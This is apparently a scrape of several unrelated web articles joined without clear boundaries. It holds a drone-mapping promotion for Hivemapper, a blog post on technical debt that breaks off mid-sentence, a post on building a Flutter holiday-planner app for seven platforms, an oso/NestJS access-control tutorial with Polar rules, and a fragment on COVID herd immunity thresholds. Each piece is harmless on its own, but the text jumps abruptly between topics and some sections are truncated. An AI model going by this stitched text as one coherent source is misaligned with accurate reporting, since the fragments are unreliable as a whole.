uploaded to Hivemapper.com</li><li id="a577">The collectors used 3 different brands and types of commodity drones and dashcam: DJI, Autel, and Blackvue</li></ul><h2 id="8876"><strong><em>Cost effective</em></strong></h2><p id="23eb">Transforming the collected video into a 3D map is compute intensive. Over the last few years, we have devised novel ways to reduce the compute cost of creating the map enabling us to scale economically. Just in the last few months we have reduced the cost to compute by an additional 60% — a cost that will come down materially with additional scale.</p><p id="bf41">Because Hivemapper is designed to work in the cloud and at the edge from inception. Everything on <a href="http://hivemapper.com/map" rel="noopener">Hivemapper.com</a> can be deployed on a high-end gaming PC. When maps are produced on-premise, we spread the compute costs across many thousands of devices that are otherwise sitting idle.</p><p id="73d8">Our platform allows us to move more of the processing to the edge. All maps produced at the edge can be merged into the global 3D map hosted at <a href="http://hivemapper.com/" rel="noopener">hivemapper.com</a>. In 2021, we will take another big leap in reducing compute costs. Stay tuned.</p><p id="8aa6">The Hivemapper map is built from video collected by commodity drones, empowering virtually anyone to become a collector and earn additional income. Our approach provides an affordable, accessible alternative to the expensive and specialized mapping vehicles and satellites.</p><p id="673a">Earlier approaches to crowdsourced mapping required learning complex GIS interfaces involving tedious amounts of tracing lines across stale satellite imagery. Collecting video for the Hivemapper map can be done, simply, by anyone with a drone or dashcam.</p></div></div><div><div><div><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/4560/1*zhFzxKRcknjxZkvYcIxjAg.png" width="2280" height="1284" srcset="https://miro.medium.com/max/552/1*zhFzxKRcknjxZkvYcIxjAg.png 276w, https://miro.medium.com/max/1104/1*zhFzxKRcknjxZkvYcIxjAg.png 552w, https://miro.medium.com/max/1280/1*zhFzxKRcknjxZkvYcIxjAg.png 640w, https://miro.medium.com/max/1456/1*zhFzxKRcknjxZkvYcIxjAg.png 728w, https://miro.medium.com/max/1632/1*zhFzxKRcknjxZkvYcIxjAg.png 816w, https://miro.medium.com/max/1808/1*zhFzxKRcknjxZkvYcIxjAg.png 904w, https://miro.medium.com/max/1984/1*zhFzxKRcknjxZkvYcIxjAg.png 992w, https://miro.medium.com/max/2000/1*zhFzxKRcknjxZkvYcIxjAg.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*zhFzxKRcknjxZkvYcIxjAg.png?q=20"></p></div></div></div><figcaption>Hivemapper mapping network</figcaption></figure></div></div></div><div><div><p id="868d">Drone pilots are growing the Hivemapper map from the air with $1,000 drones that have meaningful advantages compared over multi-million dollar satellites.

October 23, 2020 | https://labcodes.com.br/blog/articles/tech-debt.html | <a href="https://web.archive.org/web/*/https://labcodes.com.br/blog/articles/tech-debt.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>As you can see, this is a well-known monument in Italy, more specifically in Pisa, hence it’s name: <strong>Tower of Pisa.</strong></p>
<p><img alt="Pisa Tower picture" src="https://labcodes.com.br/blog/images/tech-debt/pisa-tower.png"></p>
<p>This tower has a very interesting history, it was built around the 12th century, but due to the soft ground it was built on, it started tilting. The structure was only stabilized in 2001 after 8 years of remedial work.</p>
<p>Actually, one of the corrections made during these 8 years made the tilting even worse!
Let those who never made a refactoring that made the problem worse throw the first stone. I can’t really blame anyone haha.</p>
<h2>John, the <em>purrgrammer</em></h2>
<p><img alt="John working in a computer" src="https://labcodes.com.br/blog/images/tech-debt/chico-the-purrgrammer.png"></p>
<ul>
<li>This is John.</li>
<li>John is a Senior Developer always with a lot on his plate.</li>
<li>John is also an amazing programmer with a lot of years of experience.</li>
</ul>
<p>Suddenly, a new project arrived at John’s desk, and it needed:</p>
<p><img alt="John playing with a ball" src="https://labcodes.com.br/blog/images/tech-debt/chico-features.png"></p>
<ul>
<li>Payment System</li>
<li>Social Network Authentication</li>
<li>Delivery services integration</li>
</ul>
<p>Since John is an excellent professional that always delivers his activities, he tackled the new project head-on and delivered it in time.</p>
<p><img alt="John is happy because he delivered the project in time" src="https://labcodes.com.br/blog/images/tech-debt/chico-delivered.png"></p>
<p>After John’s delivery, the rest of his team went on to review his code, and they discovered a few problems, such as:</p>
<p><img alt="Cat's reviewing John's code" src="https://labcodes.com.br/blog/images/tech-debt/chico-team-review.png"></p>
<ul>
<li>Bugs and inconsistency on payments</li>
<li>Sometimes the deliveries weren’t processed</li>
<li>Authentication was too simple when checking the social networks used</li>
</ul>
<p><img alt="John is sad because his project had some bugs" src="https://labcodes.com.br/blog/images/tech-debt/chico-bugs.png"></p>
<p>John knew his code had a few bugs. But nearing the deadline, another project appeared and it took a lot of John’s time, so he couldn’t go back and fix the problems.</p>
<p>John and his team had to deliver the project riddled with bugs and problems.</p>
<p>But John kept a positive attitude.</p>
<p>“In the future, I’ll go back and fix those bugs”</p>
<p><img alt="John is happy again, he knows that in the future he'll fix everything" src="https://labcodes.com.br/blog/images/tech-debt/chico-refactoring-en.png"></p>
<h3>SPOILER</h3>
<p>C’mon, did you really think that this was going to happen?</p>
<p><img alt="The problems in John’s project" src="https://labcodes.com.br/blog/images/tech-debt/problems-on-chicos-code-en.png"></p>
<p>Let’s dive deeper into the problems of John’s code: </p>
<ul>
<li>Payments couldn’t be processed in different currencies</li>
<li>If the delivery system is offline, the code wouldn’t work</li>
<li>Users with deactivated accounts could still access the system</li>
<li>No automated testing</li>
</ul>
<p>And this, my friends, is what we know as Technical Debt. Why?</p>
<p>Because what happened was that John chose the first solution he could think of in that short deadline, this affected the code’s quality and the team accepted this. In the future, if any logistics of the business, such as accepting different kinds of currency or changing the delivery service, needs to be changed, the <strong>Changing Cost</strong> of the code is going to be enormous. The moment John chose the faster and easiest solution for him was the moment that the Technical Debt was inserted in the code.</p>
<p>What happened with the Tower of Pisa is a lot like what we understand as Technical Debt.</p>
<p><img alt="Picture from the Tower under construction" src="https://labcodes.com.br/blog/images/tech-debt/pisa-tower-construction.png"></p>
<p>It probably started off as a couple of small mistakes and problems, but the constructors decided to ignore them and build and scale on top of these problems. The tower was built so fast that these little “bugs” in the construction jeopardized the whole structure.</p>
<p>And the same thing can happen with software. The difference is that the bugs and problems are easier to spot in the developing process, because, after a while, new features become impossible to deliver before um fix these bugs.</p>
<h2>Why is Technical Debt always bad?</h2>
<p>We are used to understanding any Technical Debt in software as a very bad thing. And it usually is.</p>
<p>But we can also see it as a strategic and/or economic decision since a project riddled with Technical Debt is still a project that was delivered fast. It can be a very positive thing for the product.</p>
<p>The problem with this approach starts when we start to forget what we have done in the past. Imagine that Technical Debt is a really greasy and tasty junk food. To eat it once or twice may be wonderful, but after the eighth ou ninth meal, it might be time to acknowledge you have a problem.</p>
<p>By accepting that it is a tradeoff, we can move faster to pay the debt in the future. It really something very normal to do.</p>
<p><img alt="Losing Quality vs. Speed up deliveries" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-tradeoff-en.png"></p>
<p>I don’t know how many of you have paid the cost of too much junk food. Just remember that this cost, as well as in software, becomes higher with time.</p>
<p>If you identified some of these situations in your day-to-day tasks, don’t worry, especially if you have some time dedicated to remedying the problem in the future. This is a really common scenario when dealing with software delivery.</p>
<h2>Technical Debt Quadrant</h2>
<p><img alt="Martin Fowler’s Technical Debt Quadrant" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-quadrant-en.png"></p>
<p>If we look at <a href="https://martinfowler.com/bliki/TechnicalDebtQuadrant.html" target="_blank">Martin Fowler’s Technical Debt Quadrant</a>, we can see John in the upper quadrants, between Reckless and Prudent. </p>
<p>He knew he didn’t have enough time to design the best solution, but he also knew that: In the future, he had to come back and improve his code.</p>
<p>Ok, accepting this as something ordinary, we can try to understand who is really responsible for the software’s debt.</p>
<h2>Who’s responsible for the debt?</h2>
<p>If we focus on the name (Technical Debt), we’re lead to think that it’s a problem made by technical people, namely: the developers, who are responsible for writing the code that ultimately caused the debt.</p>
<p>The problem is that software is the result of the structure and processes of a whole company.</p>
<p>Also, the whole software industry changed since the term “Technical Debt” was born. In John’s scenario, for example, the problem with the not-so-good solution that he crafted is more connected to a management issue, or even to the product team, than to himself. We know John is a good developer, but he had to ignore a lot of problems in order to deliver within the established deadline.</p>
<p>Sometimes the bottlenecks that are creating debt come from different parts of the company, such as:</p>
<ul>
<li>Management team vs Developers speed</li>
<li>Product team not having a long-term plan</li>
<li>UI/UX team too far from the developers</li>
</ul>
<p>But we can’t forget that, sometimes, we are indeed to blame for our own bad decisions.</p>
<p><img alt="John is sad because his bad decisions also affect the project" src="https://labcodes.com.br/blog/images/tech-debt/our-responsability-en.png"></p>
<ul>
<li>Our bad decisions counts</li>
<li>Framework smells</li>
<li>Low test coverage</li>
</ul>
<p>Like when we choose a new and exciting framework, without investing the necessary time to understand if that is the best tool for the job at hand, or even when we stop paying attention to the signs that a framework is being abandoned, or when the developers aren’t testing and refactoring the application as they should… All of this is our fault. </p>
<p>After discovering which problems we have in our code, we need to look for the tools we can use to help us deal with the situation.</p>
<h2>How to deal with the debt?</h2>
<ul>
<li>Rewriting everything?</li>
<li>Hire more people just to deal with the debt?</li>
<li>Stop delivering until we can fix some of the debt?</li>
<li>Creating Technical Debt tasks in a separate Technical Debt board?</li>
</ul>
<p>Imagine if people had simply stopped building the Tower of Pisa and destroyed everything to rebuild. The chances of the same mistakes happening, or even new mistakes, were really high. And consider the amount of money necessary for demolishing and rebuilding everything.</p>
<p>What if the company simply hired more people to fix the debts? In the case of the Tower, we would have people trying to build it higher working alongside people trying to make it straight and steady. This really doesn’t solve the main problem.</p>
<p>In software, hiring a new team to deal with existing problems would mean that the old team would have to take the time to explain the whole context of the software to the new team. And, believe me, this would take a lot more time than you’d think. </p>
<p>And what if we created a new place to store our Technical Debt task? After a while, this place would become completely invisible to the team.</p>
<p><img alt="Comic strip from the process of creating a new tech debt ticket and adding it to a backlog full of forgotten tickets using dead plants as an analogy" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-backlog.png"></p>
<p>If an ordinary developer’s backlog already has its own old and invisible tasks, imagine creating a whole different board with separate tasks. However, these are the solutions most people usually look for.</p>
<p>So, Luan, if these options aren’t the most viable, what can we do?</p>
<p>After what we already know, we must try to find truly viable solutions to deal with the Technical Debt.</p>
<h2>Sustainable solutions</h2>
<h3>1. I.M.P.A.C.T</h3>
<p><img alt="I.M.P.A.C.T cyclic process" src="https://labcodes.com.br/blog/images/tech-debt/impact.png"></p>
<p>IMPACT is a process to:</p>
<ul>
<li>Identify</li>
<li>Mark</li>
<li>Plan</li>
<li>Act</li>
<li>Test</li>
</ul>
<p>As we can see, the first step is about finding the debt spots and, in the second step, we need to make sure that these spots are noticeable for the whole team. You can assure that by creating new tasks flagged as Technical Debt, for example. We can also choose the priorities of these tasks based on their relevance. Tools like Jira have mechanisms to increase the priority of certain tasks over time, which is amazing, because, as we have seen before, the cost of a Technical Debt increases over time.</p>
<p>After that, we need to create a plan, and really follow that plan, for the marked tasks. This way, we will effectively Act on the debts and, after the fixes and improvements being implemented, we need to Test and assure that no behaviors were damaged, be it new bugs, features, improvements, or anything that could hinder the final experience.</p>
<p>You can find more detailed information about this in a book called “Refactoring for Software Design Smells - Managing Technical Debt”.</p>
<h3>2. Pareto Principle</h3>
<p>If you don’t know how many tasks you should have for each team iteration.</p>
<p><img alt="Pareto principle demonstrated using Pizza slices" src="https://labcodes.com.br/blog/images/tech-debt/pareto-principle-en.png"></p>
<p>We can use the Pareto Principle to assign 20% of the team’s productivity to Technical Debt tasks, and the 80% that remains is used in ordinary tasks, as new features, bug fixing, and everything else.</p>
<h3>3. Technical Debt Review Reunions</h3>
<p><img alt="Cat's in a Tech Debt review" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-review.png"></p>
<p>If you have big deliveries in your process after a few iterations, it might be a good thing to have post-mortem reunions to discuss everything that’s been introduced to the code that has the potential to increase the Technical Debt.</p>
<p>By doing this, we can identify the debts earlier.</p>
<p>These are three examples of possible solutions, but I’d advise you to be extra critical and choose the one that fits you and your team the best.</p>
<p>Let’s probe the economical side of this problem. Is it lucrative to work with a system that already has a big Technical Debt cost?</p>
<h2>Is it lucrative</h2>
<p>I’m going to use a lecture by <a href="https://www.youtube.com/watch?v=TQ9rng6YFeY" target="_blank">J.B. Rainsberger</a> to illustrate my point. In this lecture, Rainsberger explains the cost of the next new feature for your software and how to diminish your error rate when estimating this cost.</p>
<p><img alt="Chart comparison of the two approaches of software coding" src="https://labcodes.com.br/blog/images/tech-debt/next-feature-cost.png"></p>
<p>In this chart, he compares two different costs over time in a project.</p>
<p>As we can see, the cost of a software built without …</p></div></div>

<p><em>“One day, 7 apps, of course… How long was that day? 168 hours? Define ‘one day’!"</em><br>
Are you looking for the <a href="#definition-of-one-day">definition</a>?</p>
<h2 id="the-story">The Story</h2>
<p>Usually, every product story starts with a pain, a problem that needs to be solved. A problem that bothers you, annoys you, you face it frequently and probably you are not alone with it.<br>
This case was not different either.</p>
<p>A few months ago we started to use a new HR system that has a lot of advantages compared to the old one. But it had disadvantages too… Missing functionality, missing information… or the information is there, but hard to get it out from the system.</p>
<p>That’s when the idea of <a href="https://pandoo.tweaked.tech/">Pandoo</a> (the holiday planner) was born.</p>
<figure>
<a href="https://pandoo.tweaked.tech/">
<img src="https://danieldallos.com/images/flutter-pandoo/pandoo_icon_original.png" alt="Pandoo Icon">
</a>
</figure>
<h2 id="the-problem">The Problem</h2>
<p>The new tool did lack some features that we got used to.</p>
<p>A nice(r) and clean(er) way to see all of your holidays, your team’s holidays (and type of those holidays), and book them in a bunch.</p>
<p><strong>Disclaimer:</strong> <em>Maybe some of these problems are manageable with admin configurations or with educating the users.. but usually, when people switch tools they just expect that “it works” and they have all the things they had previously plus nice extras.</em></p>
<p><em>The goal of this article is not to blame the tool, it is about the solution and the key learnings.</em></p>
<h2 id="the-solution">The Solution</h2>
<p>I wanted to bring back the functionalities from the old tool. I wanted to see my holidays as I was used to, I wanted to book my holidays as I used to. And I was not alone with this.</p>
<h3 id="the-requirements">The Requirements</h3>
<ul>
<li>I don’t want to waste too much time on the MVP, just get it to work with the basic functionality and make me happy.</li>
<li>There is no way that I will build multiple apps using multiple programming languages.</li>
<li>Mobile-first, but bigger screen support would be nice where I can see more data.</li>
<li>Challenge myself.</li>
</ul>
<h3 id="the-choice">The Choice</h3>
<h4 id="flutter">Flutter</h4>
<figure>
<img src="https://danieldallos.com/images/flutter-pandoo/flutter.png" alt="Flutter logo">
</figure>
<p>Why?</p>
<ul>
<li>Flutter’s promise</li>
</ul>
<p><a href="https://flutter.dev/">Flutter</a> is a cross-platform tool made by Google, that helps you <strong>build native mobile apps from a single codebase</strong>.<br>
<em>(Edit (19/09/2020): This has been changed a bit as you will see it later. )</em></p>
<ul>
<li>I had some experiences already.</li>
</ul>
<p>I have built <a href="http://edengreen.tweaked.tech/">Edengreen</a>, a tool that helps you check your available meal vouchers.<br>
It is a really basic app, but it taught me the basics of how Flutter works. At this time Flutter was still in beta.</p>
<p>One of my other projects was <a href="https://coronavirusalert.tweaked.tech/">CoronaVirus Alert</a>, a tool that monitors the infections country by country and sends you push notifications.<br>
In this project, I have played with Firebase, serverless functions, and custom scripts here and there. I have learned that there is a <strong>big pool of third-party libraries</strong> for Flutter and <strong>the community is growing rapidly</strong> too.</p>
<ul>
<li>Web support</li>
</ul>
<p>I have never tried, but apparently, there was rudimentary Web support too.</p>
<ul>
<li>The challenge</li>
</ul>
<p>My previous projects helped me to understand the basics but I wanted to achieve more and the Web support was sounded interesting too.</p>
<h3 id="know-your-stuff">Know Your Stuff</h3>
<p>I needed a giant scrollable table view where horizontally I can show the days of the year and vertically all of my colleagues and their holidays.<br>
This sounds easy, but in reality, it never is. Weird, annoying edge-cases when you are almost done, lack of Flutter knowledge from my side, unforeseen platform limitations, etc…</p>
<p>I wanted to see what is available already by the community, maybe there is something that is similar and it can fit my needs (with minimal tweaking). Luckily I have found the <a href="https://pub.dev/packages/horizontal_data_table">horizontal_data_table</a> package, that provided 90% of what I have needed… I have forked the package and did some fine-tuning for my needs on the way.</p>
<p>Getting the data from the HR tool was pretty easy, they provide a nice REST API to interact with the back-end.</p>
<p>When you connect the dots you have to be cautious. You need to know what you expect from your tool, how it is going to work. How does it get the data? Do we need to store the data locally? Do we need an extra server-side logic too? Do we plan to use any exotic UI elements?</p>
<p>These are important questions, because when you pick a library/package in Flutter and e.g. if it works on Android it does not mean automatically that it works on iOS too… or even on the Web. You need to pick libraries that rely on the default native support and no additional native third-party libraries. (Or the reliance on those libraries needs to be complete on every side.)</p>
<p>For example, if you would like to use Firebase services in your app, you need to check which platforms <a href="https://github.com/FirebaseExtended/flutterfire">are supported</a>. <strong>If your target is not, probably you will face a runtime crash when Flutter tries to access the non-existent APIs.</strong></p>
<p>When you search for a Flutter package in the official <a href="https://pub.dev/">Dart/Flutter package repository</a>, you can also see which platforms are supported.</p>

<h3 id="3-apps-at-once">3 Apps at Once</h3>
<p>Based on past experiences in the MVP I did not choose any special external library (except the horizontal_data_table) because I wanted to limit the compatibility issues between iOS, Android, and Web.</p>
<p>After I was done with the minimal version, I tested the implementation on Android and iOS.<br>
It worked and looked nice! (Sure, it had some performance issues here and there while scrolling through the holidays of the whole company… but on a limited dataset it was good.)</p>

<p>So now we have <strong>two apps</strong> ready to use!</p>
<p>Let’s see how it works on the Web.<br>
Of course, it crashed in a few places 😀.
But nothing serious that a good old “if-else” could not solve. I have still used some APIs that were not available on the Web, so I needed to use <code>kIsWeb</code> <a href="https://api.flutter.dev/flutter/foundation/kIsWeb-constant.html">constant</a> to differ the logic between Web and native mobile.</p>
<p>It also had some UI quirks due to unsupported/buggy UI elements (<a href="https://github.com/flutter/flutter/issues/45505">with gradients</a>), but it was good enough for the current phase.</p>

<p>We have the <strong>third app</strong> too, and you could say <em>“Ok, you are done, you have it all, Web runs on all platforms”</em>.</p>
<p>But wait, there is more!</p>
<h3 id="the-meetup-and-the-extra-3-apps">The Meetup and The Extra 3 Apps</h3>
<p>I really like Meetups. I can meet with like-minded people, listen to good and interesting presentations, and sometimes <a href="https://www.meetup.com/gdg-brussels/photos/27573830/457831934/">I give a talk too</a> 😊.</p>
<p>There was a promising Meetup from <a href="https://www.meetup.com/gdg-brussels/events/268503398/">GDG Brussels on Flutter topic</a>. Based on the presentation summary, it intended to be a basic Flutter intro and the experiences of the author.<br>
So it could be nothing interesting for me, I am kinda done with the basics… but I always like to repeat similar things, because maybe I can discover a new bit of information that can change my perspective and start me thinking.
For the same reason, I read/listen to books on similar topics too… even the 95% is the same as a previous book, the remaining 5% is worth the time.</p>
<p><strong>Luckily this case was not different either.</strong><br>
The presenter walked through their app development challenges and how quickly they have re-implemented the apps from scratch in Flutter.</p>
<p>Then he showed something interesting. His app was in a weird-looking window. It looked like a browser or a bezel-less iOS simulator. Apparently, it was his application compiled into a <strong>native MacOS app</strong>. It turned out that Flutter added support for <a href="https://flutter.dev/desktop">Desktop</a> platforms. Obviously, this was even in an earlier stage than the Web support, but it is worth a try.</p>
<p>The next day I tried it, it worked! I had Pandoo as a native MacOS app. Meanwhile, I have discovered that there is also really basic support for Linux and Windows… After the initial setup of the environments in VirtualBox, I could compile Pandoo as a <strong>native Windows and Linux app</strong> too! 🎉</p>
<p>Sure, there were some extra limitations on Windows and Linux, I had to do some extra “if-else” conditions. E.g. there was no persistent storage API available on these platforms, so I could not save any data to the disk.<br>
<em>(Edit (19/09/2020): Later I did polyfill these missing features by using the default Dart file reading and writing APIs.)</em></p>
<p>Extra <strong>three apps are done</strong>. Sounds good, doesn’t it?</p>

<h3 id="1">+1</h3>
<p>We can argue on this if it counts as the seventh app or not. But it was such a nice surprise to me, so please allow me to count it as +1.</p>
<p>While I was testing Pandoo in the Chrome Browser on my phone, I got a popup that asked me if I would like to add Pandoo to my home screen. Sure, why not. But this icon on my home screen looked different from another page link. And… it also appeared between my apps in the Launcher. What?</p>
<p>It turned out that the <strong>Web apps built by Flutter are PWA applications</strong> too. So even if the device is offline, you can open and use the web apps.
Or, you could… if a webpage is made for that. In my case I don’t cache any data from the HR tool, I fetch all the data from the API every time.
That means when Pandoo is loaded inside the browser and you try to use it without an Internet connection, it shows an API error (just like all the other versions of the app). I could save the last fetched data locally and load it immediately at app start (while the new is loading)… but for now, it is ok as it is.</p>
<h2 id="conclusion">Conclusion</h2>
<p>I think Flutter is a strong candidate in the app development era. Not only for mobile but in general.</p>
<p>I did not write a single line of code to have a Mac OSX app. Although I have some experiences with Mac OSX apps (<a href="https://mike.tweaked.tech/">Mike</a>) so I would have an idea where to start, it is not a copy/paste from an iOS app, you need to put some work there. Hopefully <a href="https://developer.apple.com/mac-catalyst/">Mac Catalyst</a> will help with this in the future.</p>
<p>Write an app for Windows and Linux? I would not even think about it.</p>
<p>The additional Web support is really nice, and it can be really useful. For example, if you have a Revolut and TransferWise account you probably noticed that the mobile apps are very similar to each other, and they also provide a Web version too with a limited feature set. I don’t know what technologies they use, but (if not Flutter already) I can imagine in the future these kinds of services will consider Flutter for their apps.</p>

<p>Probably at this point, you think <em>“How on Earth was this possible in one day”</em>?</p>
<p>My definition of one day: <strong>14-16 hours</strong>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>I regularly hold office hours where I speak with users about problems they're coming up against in auth. Following a recent conversation, the engineer I spoke with and I built a demo app using <a href="https://nestjs.com/">NestJS</a> (a JavaScript web framework) and oso to mock up how access control would work in his company's core application.</p>
<p>I thought I'd share the demo app, which uses several common patterns –&nbsp;e.g., roles, hierarchies, and attributes –&nbsp;as well as how to make oso work in a web framework. In this post, we will show:</p>
<ul>
<li>How to use the oso Node.js library</li>
<li>How to represent common access control patterns in using Polar, the oso policy language</li>
<li>What a declarative approach to policy code looks like</li>
</ul>
<h2><strong>Install and run the demo</strong></h2>
<p>The demo app is <a href="https://github.com/osohq/oso-nest-demo">available on GitHub</a> and contains a <a href="https://github.com/osohq/oso-nest-demo/blob/master/README.md">step-by-step tutorial</a> that explains how the app works and provides the details of the oso implementation.</p>
<p>The app is a document management system. Users can create, read, update, and delete Documents if they have the proper authorization. Documents are grouped into Projects. Users can be members of projects, or can even be Guests to the system (i.e., unauthenticated altogether).</p>
<p>The authorization spec is written using Polar and is organized in two files 1) <a href="https://github.com/osohq/oso-nest-demo/blob/main/src/oso/roles.polar">roles.polar</a>, which defines roles and their relationships; and 2) <a href="https://github.com/osohq/oso-nest-demo/blob/main/src/oso/permissions.polar">permissions.polar</a>, which defines the rules by which users acquire roles and the access privileges each role is granted.</p>
<p>To see the specifics of how we implemented the demo app and used the oso Node.js library, I would encourage you to run through the tutorial and crack open the code. For the rest of this post, let's focus on how we implement the demo's authorization spec in Polar.</p>
<h2><strong>Roles and authentication in the app code</strong></h2>
<p>The demo app has three roles: "owner", "member", and "guest".</p>
<p>The app's <a href="https://github.com/osohq/oso-nest-demo/blob/main/src/document/document.controller.ts">DocumentController</a> uses a class decorator to put a <a href="https://github.com/osohq/oso-nest-demo/blob/main/src/auth/basic-auth.guard.ts">BasicAuthGuard</a> and <code>OsoGuard</code> on all of its request-handling methods:</p>
<pre><code>@UseGuards(BasicAuthGuard, OsoGuard, OsoInstance)
@Controller('document')
@Resource('Document')
export class DocumentController {
</code></pre>

<p>The authentication guard tries to resolve a User object based on credentials in the Request and, if successful, puts that authenticated User object in Request.user. Otherwise, the user defaults to being a Guest user.</p>
<h2><strong>Roles and authorization in oso</strong></h2>
<p>Authentication-based access control is a good first line of defense, but we'll use oso for finer-grained authorization via the class-scoped <a href="https://github.com/osohq/oso-nest-demo/blob/main/src/oso/oso-instance.ts"><code>OsoInstance</code></a>, the method-scoped <a href="https://github.com/osohq/oso-nest-demo/blob/main/src/oso/oso.guard.ts"><code>OsoGuard</code></a>, and the parameter-scoped <a href="https://github.com/osohq/oso-nest-demo/blob/main/src/oso/oso.guard.ts#L34"><code>@Authorize</code></a> decorations used in the <code>DocumentController</code>.</p>
<p>For example, the <a href="https://github.com/osohq/oso-nest-demo/blob/main/src/oso/oso.guard.ts#L34"><code>@Authorize</code></a> parameter provides an authorize() function used inside the controller methods to authorize access to a particular resource. One such usage is in the findOne method, to determine whether the target document can be read by the current user.</p>
<pre><code>@Get(':id')
async findOne(@Param("id") id: string, @Authorize() authorize: any): ... {
  const document = await this.documentService.findOne(Number.parseInt(id));
  await authorize(document);
  return document ? new FindDocumentDto(document) : undefined;
}
</code></pre>

<h2><strong>Role definitions</strong></h2>
<p>Roles are defined in roles.polar. If there is a Guest object in Request.user, the visitor is granted the "guest" role:</p>
<pre><code># The "Guest" actor has "guest" role
role(_guest: Guest, "guest", _document: Document);
</code></pre>

<p>Here, a User is granted the "owner" role for a Document if their user id matches the Document's ownerId:</p>
<pre><code>role(user: User, "owner", document: Document) if
    document.ownerId = user.id;
</code></pre>

<p>Users can also be project owners/members, and a User's role for a Document is inherited from their role for the Project:</p>
<pre><code>## Document roles from project roles
# User has a role for an document if they have the same
# role for the project
role(user: User, role, document: Document) if
    role(user, role, document.project);
</code></pre>

<p>Here, further roles are inherited based on earlier role definitions:</p>
<pre><code>## Role inheritance. Owner &gt; Member &gt; Guest

# User is a member of a Document if they are an owner of that Document
role(user: User, "member", document: Document) if
    role(user, "owner", document);
</code></pre>

<h2><strong>Role-based access control</strong></h2>
<p>Using <a href="https://docs.osohq.com/using/examples/rbac.html">role-based access control (RBAC)</a>, we allow or deny access to read or write documents based on a user's role. The following rules express role-based privileges:</p>
<p>Allow any authenticated user to create a document:</p>
<pre><code>allow(_user: User, "create", "Document");
</code></pre>

<p>Allow a user to read a document if they are a member of that document:</p>
<pre><code>allow(user: User, "read", document: Document) if
    role(user, "member", document);
</code></pre>

<p>Allow a user to delete a document if they are the owner of that document:</p>
<pre><code>allow(user: User, "delete", document: Document) if
    role(user, "owner", document);
</code></pre>

<h2><strong>Why role-based access control isn't enough</strong></h2>
<p>For some of the rules we want to express, role-based access works well. But it doesn't always let us express all the scenarios we need in our app.</p>
<p>For example, the engineer I met with during office hours wanted to be able give customers the ability to restrict view access to documents by setting a ‘members-only' flag. That is, a document would be visible to everyone unless it had that flag, in which case only members could view it..</p>
<p>Here, statically assigning roles to particular users isn't enough. We need a way of dynamically checking access based on attributes of the user and the resource (i.e., the document) in question. This is <a href="https://docs.osohq.com/using/examples/abac.html">attribute-based access control (ABAC)</a>.</p>
<p>Without changing any application code, we can add a three-line policy to express this condition.</p>
<p>The below rule says that any Guest can read a Document if the <em>document</em> does not have the 'members_only' condition:</p>
<pre><code>allow(user: Guest, "read", document: Document) if
    role(user, "guest", document)
    and not members_only(document);
</code></pre>

<p>Actually, this isn't the first time we've used attributes. We used them in prior examples to define roles -- i.e. we identified the "owner" role of a document based on matching the user.ownerId and document.id attributes. But in this most recent case, we're going a step further and using the attributes to make finer-grained access control decisions, which is a big step up over what this might look like if we were to try to do it in the application:</p>
<pre><code>function authorize(user: User, project: Project, document: Document, action: Action): boolean {
  const role: Role = getRoleForDocument(user, document);
  switch (action) {
    case Action.Create:
      if (role == Role.Guest) {
        return false
      } else if (role == Role.Owner || role == Role.Admin) {
        return true
      } else if (project == null) {
        return false
      } else if (project.getMembers().has(user.id)) {
        return true
      }
      break;
    case Action.Read:
      return (role == Role.Guest &amp;&amp; !document.membersOnly) || role != Role.Guest;
    case Action.Update:
      return role != Role.Guest;
    case Action.Delete:
      return role == Role.Owner || role == Role.Admin;
    default:
      return false
  }
}
</code></pre>

<p>While a toy example like this might be reasonably manageable in app code, it's not hard to imagine the logic getting significantly messier as new role and action relationships bloom over the life of the application.</p>
<h2><strong>Extensibility and separation of concerns</strong></h2>
<p>One advantage of separating authorization concerns from business logic is being able to modify or extend authorization policy without changing any application code. For example, let's say we want to add the notion of an "organization" where members of the organization have the same privileges as members of the document or project. In two lines of Polar, we can extend the role a user has in an organization and all of its privileges to documents:</p>
<pre><code># User has a role for a project if they have the same
# role for the organization
role(user: User, role, project: Project) if
    role(user, role, project.organization());
</code></pre>

<p>And since document roles already inherit from project roles, we are done!</p>
<h2><strong>New roles, new rules</strong></h2>
<p>As an app evolves, and its entity relationships grow more complex, extensibility and a clean abstraction for this kind of logic becomes especially useful.</p>
<p>If, for example, we need to add support for external parties to have limited access to documents, we don't need to change any controller logic or examine if statements in our application codebase. We can implement it by synthesizing a new "external" role in our policy code.</p>
<pre><code>role(user: User, "external", project: Project) if
    project.isMember(user.id)
    and user.isExternal

allow(user, action, document: Document) if
    role(user, "external", document)
    and document_action(action, "read");
</code></pre>

<p>In two stanzas, we've created a new role type and only granted read access to Document, as suitable for an external party like an SEO consultant.</p>
<h2><strong>Conclusion</strong></h2>
<p>We now have 10 rules: to check for whether a User is a guest, owns a document, or owns a project; to give certain users the ability to read, edit and delete documents; to give external parties a way to access documents; and more. These are declarative rules that the engineer can express and add as they come up, without having to rationalize or explicitly describe the combinations of the various policies and their potential outcomes. Under the surface, oso searches through the declared rules using inferences and backtracking to find whether there exists a set of satisfied conditions to evaluate to true.</p>
<p>This is one way that declarative approaches can be especially useful – you just express what you want the outcome to be.</p>

It has been misconstrued or oversimplified in a harmful way by the media and even by some experts. The herd immunity threshold (HIT) is the percent of a population that is required to be immune in order for COVID cases to start to decrease, and it’s dependent on human social connectivity. The more people that the average person comes into contact with, and the more likely that that contact will result in an infection, the faster the spread and the higher the herd immunity threshold. The HIT will be different in crowded cities vs. farm lands and in different cultures and age groups. Cultures who greet each other with hugs and kisses (such as France and Italy), for instance, will have faster spread than cultures that don’t touch when greeting (Japan). Therefore “kissy cultures” will require a greater proportion of people to be immune than “non-kissy cultures” to control spread. </p>



